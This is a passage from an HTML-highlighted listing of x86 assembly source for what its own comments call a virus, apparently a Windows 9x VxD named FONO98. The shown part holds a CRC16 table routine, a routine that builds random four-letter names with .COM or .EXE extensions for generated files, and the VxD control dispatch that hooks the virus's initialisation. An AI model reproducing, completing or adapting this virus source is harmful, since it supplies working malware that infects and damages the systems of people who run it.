         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a001h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">CrcTab</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
  </span><span class="sc5">crc16nb</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
  </span><span class="sc5">crc16l</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">crc16sk</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
  </span><span class="sc5">crc16sk</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crc16l</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">                                 </span><span class="sc1">;make da table</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">crc16nb</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">CRC16Loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CrcTab</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;make CRC16 of it</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">CRC16Loop</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">CRC16</span><span class="sc0">



</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">Random4Name</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'AAAA'</span><span class="sc0">           </span><span class="sc1">;setup base name</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
  </span><span class="sc5">NextLetter</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01111b</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                </span><span class="sc1">;add random values to make</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                               </span><span class="sc1">;random letter, to obtain a</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">NextLetter</span><span class="sc0">                       </span><span class="sc1">;random name! :)</span><span class="sc0">
         </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
       </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'C'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'O'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'M'</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">PutThisOne</span><span class="sc0">                         </span><span class="sc1">;put a .COM extension</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
       </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'X'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E'</span><span class="sc0">
  </span><span class="sc5">PutThisOne</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;or a .EXE one</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">Random4Name</span><span class="sc0">



</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">FONO98_Control</span><span class="sc0">
         </span><span class="sc5">Control_Dispatch</span><span class="sc0"> </span><span class="sc5">Init_Complete</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FONO98_Device_Init</span><span class="sc0">
         </span><span class="sc6">clc</span><span class="sc0">                                   </span><span class="sc1">;our init procedure...</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">                                   </span><span class="sc1">;other virus wait for more</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">FONO98_Control</span><span class="sc0">                         </span><span class="sc1">;calls... but i did only this</span><span class="sc0">
                                               </span><span class="sc1">;one and it worked, so...</span><span class="sc0">


</span><span class="sc5">VxD_Locked_Code_Ends</span><span class="sc0">

</span><span class="sc9">End</span><span class="sc0">
</span></div></body>
</html>
